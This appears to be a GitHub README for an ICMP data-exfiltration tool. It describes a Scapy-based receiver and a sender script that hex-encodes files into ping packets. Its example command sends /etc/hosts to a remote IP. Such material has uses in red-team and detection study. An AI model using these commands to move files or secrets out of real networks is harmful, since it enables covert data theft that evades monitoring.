# ICMP-Data-Exfiltration

This program is used to send data over the network within "ICMP Packets", with the help of the "PING" command.
we can send any type of file over the network between two hosts with the help of this script.


## Requirements
Need to have the [Scapy] library installed to sniff packets on the network.

### Installations
```bash 

pip3 install scapy

```
or
```bash 

sudo apt install python3-scapy

```

## Examples of How To Use
The program works with two files.

First one "icmp_exfiltration.py", this file we will use as a receiver by running this file we will automatically
start listening for any "ICMP packets" that are coming towards our host machine, once we start receiving packets
this script will automatically decode the message and print it to the display and also in the same time the script
will save the output to indicate file.

Second file "icmp_sendData.py", with the help of this script we can send any type of file we want to another host 
where it is listening for our communication, we just need to provide the destination "IP-Address" and "FILE NAME" 
to the script, and it will automatically convert our data into "HEXADECIMAL" and send it to its destination.

### Help Menu
#### icmp_exfiltration.py
```bash
❯ sudo python3 icmp_exfiltration.py

┃  [!] Usage icmp_exfiltration.py <Interface-Name> <File-name to save data>                         
```

#### icmp_sendData.py
```bash
❯ sudo python3 icmp_sendData.py

┃  [!] Usage ../ICMP-Data-Exfiltration/icmp_sendData.py <IP-Address> <File-Name to send over the network>
```

### Usage
#### icmp_exfiltration.py
```bash
❯ sudo python3 icmp_exfiltration.py wlan0 data.txt
                                                                                                                                                                                      
┃  [*]  Listening for any incoming connections...                                                                                                                                         
                                                                                                                                                                                          
┃  [*]  Saving data to file 

127.0.0.1       localhost
127.0.1.1       Gurpreet06                        
```
First we run the "icmp_exfiltration.py" file specifying which interface we want to listen on.

#### icmp_sendData.py
```bash
❯ python3 icmp_sendData.py 172.16.223.1 /etc/hosts

┃  [*]  Hosts active,  Linux system

┃  [*]  Trying to send file..

100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 720000/720000 [00:00<00:00, 4097689.59it/s]

┃  [*]  File sent successfully
```

Then from another host we will run the "icmp_sendData.py" script by providing the destination "IP-Address" and "FILE NAME"
and it will automatically send  the file to another host terminal.

## Test

https://user-images.githubusercontent.com/74554439/158271576-cd6a262e-fb1e-41b7-afbd-19e7f231143a.mp4
